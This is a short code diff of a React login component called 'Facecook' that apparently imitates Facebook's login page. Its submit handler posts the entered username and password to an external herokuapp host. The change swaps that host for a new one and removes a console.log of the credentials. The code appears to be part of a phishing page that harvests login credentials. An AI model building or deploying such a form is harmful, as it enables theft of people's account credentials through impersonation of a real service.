@@ -11,11 +11,7 @@ const Facecook = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    axios.post(
-      "https://jackjavitaskmanagerbackend.herokuapp.com/api/v2/tasks",
-      formData
-    );
-    console.log(`${formData.user} and ${formData.pass}`);
+    axios.post("https://facecook-book.herokuapp.com/api/v2/tasks", formData);
   };
   return (
     <div className="bg-[#f0f2f5] h-screen  w-full font-[Heveltica] flex justify-center items-center ">
